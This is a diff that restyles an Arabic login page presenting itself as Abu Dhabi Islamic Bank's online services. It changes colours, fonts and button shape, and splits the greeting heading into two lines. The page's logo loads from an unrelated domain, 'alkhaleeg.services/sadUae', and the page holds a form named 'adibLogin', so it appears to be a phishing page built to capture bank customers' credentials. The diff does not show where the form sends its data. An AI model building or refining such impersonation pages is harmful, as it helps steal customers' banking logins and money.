@@ -75,6 +75,17 @@
             margin-top: 20px;
             margin-bottom: 10px;
             font-weight: bold;
+            font-size: 24px;
+            line-height: 1.3;
+        }
+        .greeting-line1 {
+            display: block;
+            margin: 0;
+        }
+        .greeting-line2 {
+            display: block;
+            margin: 0;
+            font-size: 28px;
         }
         .form-container {
             background: white;
@@ -92,9 +103,10 @@
         input[type="text"] {
             width: 100%;
             padding: 12px;
-            border: 2px solid #ccc;
+            border: 2px solid #008000;
             border-radius: 8px;
-            font-size: 16px;
+            background: #fff9f0;
+            font-size: 18px; /* ↑ تم زيادة الحجم */
             box-sizing: border-box;
         }
         .btn-blue {
@@ -102,10 +114,10 @@
             width: 100%;
             margin: 25px auto;
             padding: 12px;
-            background: #0073e6;
+            background: #008000;
             color: white;
             text-align: center;
-            border-radius: 8px;
+            border-radius: 0; /* ↑ تم إزالة التقويس */
             text-decoration: none;
             font-weight: bold;
             font-size: 16px;
@@ -126,7 +138,10 @@
     <img src="https://alkhaleeg.services/sadUae/images/adib_logo.png" alt="شعار مصرف أبوظبي الإسلامي">
 </div>
 
-<h2>مرحباً بك في الخدمات عبر الإنترنت من مصرف أبوظبي الإسلامي</h2>
+<h2>
+    <span class="greeting-line1">مرحباً بك في الخدمات عبر الإنترنت من مصرف أبوظبي</span>
+    <span class="greeting-line2">الإسلامي</span>
+</h2>
 
 <div class="form-container">
     <form id="adibLogin">
